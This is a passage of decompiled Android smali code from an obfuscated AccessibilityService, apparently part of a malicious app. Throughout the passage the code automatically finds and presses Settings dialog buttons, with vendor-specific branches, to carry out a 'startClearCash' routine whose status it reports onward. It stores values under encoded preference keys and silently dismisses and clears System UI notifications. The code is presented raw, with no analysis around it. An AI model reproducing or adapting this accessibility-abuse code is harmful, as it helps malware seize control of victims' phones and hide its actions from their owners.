    invoke-virtual {p0, v8, v5}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    invoke-virtual {v6, v3, v4}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->s()V

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f()V

    .line 15
    sget-object v8, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v8}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v8}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v8

    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-interface {v8, v9, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v8}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 16
    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->l()V

    :goto_10
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v8

    if-nez v8, :cond_3a

    goto/16 :goto_e

    :cond_3a
    const-string v9, "com.android.settings:id/button1"

    invoke-virtual {v8, v9}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v8

    if-nez v8, :cond_3b

    goto/16 :goto_e

    :cond_3b
    invoke-static {v8}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v8, :cond_3c

    goto/16 :goto_e

    :cond_3c
    invoke-virtual {p0, v8, v5}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    invoke-virtual {v6, v3, v4}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->s()V

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f()V

    .line 17
    sget-object v6, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v6}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v6}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v6

    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-interface {v6, v8, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v6}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 18
    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->l()V

    goto/16 :goto_e

    :cond_3d
    iget-object v6, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f:Ljava/lang/String;

    const-string v9, "honor"

    invoke-static {v6, v9, v5, v8}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v6

    if-eqz v6, :cond_48

    sget-object v2, Lb0/b;->a:Lb0/b;

    invoke-virtual {v2}, Lb0/b;->m()Ljava/util/Set;

    move-result-object v2

    invoke-static {v2}, Lk0/f;->G(Ljava/lang/Iterable;)Ljava/util/List;

    move-result-object v2

    check-cast v2, Ljava/util/ArrayList;

    invoke-virtual {v2}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :goto_11
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v6

    if-eqz v6, :cond_6f

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Ljava/lang/String;

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v8

    if-nez v8, :cond_3e

    goto :goto_11

    :cond_3e
    invoke-virtual {v8, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v6

    if-nez v6, :cond_3f

    goto :goto_11

    :cond_3f
    invoke-static {v6}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v6, :cond_40

    goto :goto_11

    :cond_40
    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    invoke-static {v6, v7}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {p0, v6, v5}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    if-nez v6, :cond_41

    goto :goto_12

    :cond_41
    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z

    :goto_12
    sget-object v6, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-virtual {v6, v3, v4}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v8

    if-nez v8, :cond_42

    goto :goto_13

    :cond_42
    const-string v9, "com.android.settings:id/button_2"

    invoke-virtual {v8, v9}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v8

    if-nez v8, :cond_43

    goto :goto_13

    :cond_43
    invoke-static {v8}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v8, :cond_44

    goto :goto_13

    :cond_44
    invoke-virtual {p0, v8, v5}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    invoke-virtual {v6, v3, v4}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->s()V

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f()V

    .line 19
    sget-object v8, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v8}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v8}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v8

    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-interface {v8, v9, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v8}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 20
    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->l()V

    :goto_13
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v8

    if-nez v8, :cond_45

    goto/16 :goto_11

    :cond_45
    const-string v9, "com.android.settings:id/button1"

    invoke-virtual {v8, v9}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v8

    if-nez v8, :cond_46

    goto/16 :goto_11

    :cond_46
    invoke-static {v8}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v8, :cond_47

    goto/16 :goto_11

    :cond_47
    invoke-virtual {p0, v8, v5}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    invoke-virtual {v6, v3, v4}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->s()V

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f()V

    .line 21
    sget-object v6, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v6}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v6}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v6

    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-interface {v6, v8, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v6}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 22
    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->l()V

    goto/16 :goto_11

    :cond_48
    sget-object v6, Lb0/b;->a:Lb0/b;

    invoke-virtual {v6}, Lb0/b;->m()Ljava/util/Set;

    move-result-object v7

    invoke-static {v7}, Lk0/f;->G(Ljava/lang/Iterable;)Ljava/util/List;

    move-result-object v7

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v8

    invoke-static {v7}, Lk0/f;->N(Ljava/lang/Iterable;)Ljava/util/List;

    move-result-object v7

    invoke-virtual {p0, v8, v7}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->A(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/util/List;)Z

    move-result v7

    if-eqz v7, :cond_6f

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v7

    if-nez v7, :cond_49

    goto :goto_14

    :cond_49
    invoke-virtual {v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z

    :goto_14
    invoke-virtual {v6}, Lb0/b;->l()Ljava/util/Set;

    move-result-object v6

    invoke-interface {v6}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v6

    :cond_4a
    invoke-interface {v6}, Ljava/util/Iterator;->hasNext()Z

    move-result v7

    if-eqz v7, :cond_4d

    invoke-interface {v6}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Ljava/lang/String;

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v8

    if-nez v8, :cond_4b

    goto :goto_15

    :cond_4b
    invoke-virtual {v8, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v7

    if-nez v7, :cond_4c

    :goto_15
    move-object v7, v2

    goto :goto_16

    :cond_4c
    invoke-static {v7}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/view/accessibility/AccessibilityNodeInfo;

    :goto_16
    if-eqz v7, :cond_4a

    invoke-virtual {p0, v7, v5}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    sget-object v6, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-virtual {v6, v3, v4}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->s()V

    :cond_4d
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    if-nez v6, :cond_4e

    goto :goto_17

    :cond_4e
    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z

    :goto_17
    sget-object v6, Lb0/b;->a:Lb0/b;

    invoke-virtual {v6}, Lb0/b;->n()Ljava/util/Set;

    move-result-object v6

    invoke-interface {v6}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v6

    :cond_4f
    invoke-interface {v6}, Ljava/util/Iterator;->hasNext()Z

    move-result v7

    if-eqz v7, :cond_52

    invoke-interface {v6}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Ljava/lang/String;

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v8

    if-nez v8, :cond_50

    goto :goto_18

    :cond_50
    invoke-virtual {v8, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v7

    if-nez v7, :cond_51

    :goto_18
    move-object v7, v2

    goto :goto_19

    :cond_51
    invoke-static {v7}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/view/accessibility/AccessibilityNodeInfo;

    :goto_19
    if-eqz v7, :cond_4f

    invoke-virtual {p0, v7, v5}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    sget-object v6, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-virtual {v6, v3, v4}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->s()V

    :cond_52
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    if-nez v6, :cond_53

    goto :goto_1a

    :cond_53
    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z

    :goto_1a
    sget-object v6, Lb0/b;->a:Lb0/b;

    invoke-virtual {v6}, Lb0/b;->p()Ljava/util/Set;

    move-result-object v6

    invoke-interface {v6}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v6

    :cond_54
    invoke-interface {v6}, Ljava/util/Iterator;->hasNext()Z

    move-result v7

    if-eqz v7, :cond_57

    invoke-interface {v6}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Ljava/lang/String;

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v8

    if-nez v8, :cond_55

    goto :goto_1b

    :cond_55
    invoke-virtual {v8, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v7

    if-nez v7, :cond_56

    :goto_1b
    move-object v7, v2

    goto :goto_1c

    :cond_56
    invoke-static {v7}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/view/accessibility/AccessibilityNodeInfo;

    :goto_1c
    if-eqz v7, :cond_54

    invoke-virtual {p0, v7, v5}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    sget-object v6, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-virtual {v6, v3, v4}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->s()V

    :cond_57
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    if-nez v6, :cond_58

    goto :goto_1d

    :cond_58
    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z

    :goto_1d
    sget-object v6, Lb0/b;->a:Lb0/b;

    invoke-virtual {v6}, Lb0/b;->q()Ljava/util/Set;

    move-result-object v6

    invoke-interface {v6}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v6

    :cond_59
    invoke-interface {v6}, Ljava/util/Iterator;->hasNext()Z

    move-result v7

    if-eqz v7, :cond_5c

    invoke-interface {v6}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Ljava/lang/String;

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v8

    if-nez v8, :cond_5a

    goto :goto_1e

    :cond_5a
    invoke-virtual {v8, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v7

    if-nez v7, :cond_5b

    :goto_1e
    move-object v7, v2

    goto :goto_1f

    :cond_5b
    invoke-static {v7}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/view/accessibility/AccessibilityNodeInfo;

    :goto_1f
    if-eqz v7, :cond_59

    invoke-virtual {p0, v7, v5}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    sget-object v6, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-virtual {v6, v3, v4}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->s()V

    :cond_5c
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    if-nez v6, :cond_5d

    goto :goto_20

    :cond_5d
    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z

    :goto_20
    sget-object v6, Lb0/b;->a:Lb0/b;

    invoke-virtual {v6}, Lb0/b;->o()Ljava/util/Set;

    move-result-object v6

    invoke-interface {v6}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v7

    :cond_5e
    invoke-interface {v7}, Ljava/util/Iterator;->hasNext()Z

    move-result v8

    if-eqz v8, :cond_61

    invoke-interface {v7}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Ljava/lang/String;

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v9

    if-nez v9, :cond_5f

    goto :goto_21

    :cond_5f
    invoke-virtual {v9, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v8

    if-nez v8, :cond_60

    :goto_21
    move-object v8, v2

    goto :goto_22

    :cond_60
    invoke-static {v8}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/view/accessibility/AccessibilityNodeInfo;

    :goto_22
    if-eqz v8, :cond_5e

    invoke-virtual {p0, v8, v5}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    sget-object v7, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-virtual {v7, v3, v4}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->s()V

    :cond_61
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v7

    if-nez v7, :cond_62

    goto :goto_23

    :cond_62
    invoke-virtual {v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z

    :goto_23
    invoke-interface {v6}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v6

    :cond_63
    invoke-interface {v6}, Ljava/util/Iterator;->hasNext()Z

    move-result v7

    if-eqz v7, :cond_66

    invoke-interface {v6}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Ljava/lang/String;

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v8

    if-nez v8, :cond_64

    goto :goto_24

    :cond_64
    invoke-virtual {v8, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v7

    if-nez v7, :cond_65

    :goto_24
    move-object v7, v2

    goto :goto_25

    :cond_65
    invoke-static {v7}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/view/accessibility/AccessibilityNodeInfo;

    :goto_25
    if-eqz v7, :cond_63

    invoke-virtual {p0, v7, v5}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    sget-object v2, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-virtual {v2, v3, v4}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->s()V

    :cond_66
    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f()V

    .line 23
    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v2}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-interface {v2, v0, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 24
    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->l()V

    return-void

    :cond_67
    :goto_26
    sget-object v2, Lb0/b;->a:Lb0/b;

    invoke-virtual {v2}, Lb0/b;->m()Ljava/util/Set;

    move-result-object v2

    invoke-static {v2}, Lk0/f;->G(Ljava/lang/Iterable;)Ljava/util/List;

    move-result-object v2

    check-cast v2, Ljava/util/ArrayList;

    invoke-virtual {v2}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :goto_27
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v6

    if-eqz v6, :cond_6f

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Ljava/lang/String;

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v7

    if-nez v7, :cond_68

    goto :goto_27

    :cond_68
    invoke-virtual {v7, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v6

    if-nez v6, :cond_69

    goto :goto_27

    :cond_69
    invoke-static {v6}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v6, :cond_6a

    goto :goto_27

    :cond_6a
    invoke-virtual {p0, v6, v5}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    if-nez v6, :cond_6b

    goto :goto_28

    :cond_6b
    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z

    :goto_28
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    if-nez v6, :cond_6c

    goto :goto_27

    :cond_6c
    const-string v7, "com.android.settings:id/button1"

    invoke-virtual {v6, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v6

    if-nez v6, :cond_6d

    goto :goto_27

    :cond_6d
    invoke-static {v6}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v6, :cond_6e

    goto :goto_27

    :cond_6e
    invoke-virtual {p0, v6, v5}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    sget-object v6, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-virtual {v6, v3, v4}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->s()V

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f()V

    .line 25
    sget-object v6, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v6}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v6}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v6

    invoke-static {v0}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-interface {v6, v7, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v6}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 26
    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->l()V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_2

    goto :goto_27

    :catchall_2
    move-exception v0

    invoke-static {v0}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_6f
    :goto_29
    return-void
.end method

.method public final l()V
    .locals 4

    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    const-string v1, "startClearCash"

    const-string v2, "end"

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    sget-object v1, Lc0/b;->a:Lc0/b;

    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v2, "obj.toString()"

    invoke-static {v0, v2}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v2, "startClearCash"

    const-string v3, ""

    invoke-virtual {v1, p0, v3, v0, v2}, Lc0/b;->j(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method public final m()V
    .locals 3

    .line 1
    sget-object v0, Ls0/c;->d:Landroid/content/SharedPreferences;

    const-string v1, "OTRHYmsyU3dnOWRhZERJeTNNYUtOdz09OjpWNzFKSXk5SU5POCs0TXprellzN3ZRPT0="

    const-string v2, ""

    invoke-static {v0, v1, v2}, Landroidx/activity/result/a;->a(Landroid/content/SharedPreferences;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_0

    goto :goto_0

    :cond_0
    move-object v2, v0

    .line 2
    :goto_0
    const-string v0, "1"

    invoke-static {v2, v0}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    const-string v0, "com.android.systemui"

    const-string v1, "dismiss_text"

    const/4 v2, 0x0

    invoke-virtual {p0, v0, v1, v2}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->p(Ljava/lang/String;Ljava/lang/String;Z)Z

    const-string v0, "com.android.systemui"

    const-string v1, "clear_all"

    invoke-virtual {p0, v0, v1, v2}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->p(Ljava/lang/String;Ljava/lang/String;Z)Z

    :cond_1
    return-void
.end method

.method public final n(Landroid/view/accessibility/AccessibilityNodeInfo;Z)V
    .locals 1

    const/16 v0, 0x10

    if-eqz p2, :cond_0

    :try_start_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isVisibleToUser()Z

    move-result p2

    if-eqz p2, :cond_1

